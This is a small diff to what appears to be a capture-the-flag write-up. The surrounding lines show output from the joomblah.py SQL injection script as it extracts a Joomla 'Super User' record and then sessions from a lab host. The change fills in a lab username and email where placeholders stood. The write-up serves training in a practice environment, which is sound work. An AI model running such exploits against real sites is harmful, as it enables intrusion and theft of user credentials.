@@ -48,7 +48,7 @@ $ python3 joomblah.py http://trgt/
  [-] Testing SQLi
   -  Found table: fb9j5_users
   -  Extracting users from fb9j5_users
- [$] Found user ['811', 'Super User', '<user>', '<email>', '<password hash>', '', '']
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '<password hash>', '', '']
   -  Extracting sessions from fb9j5_session
 ```
 
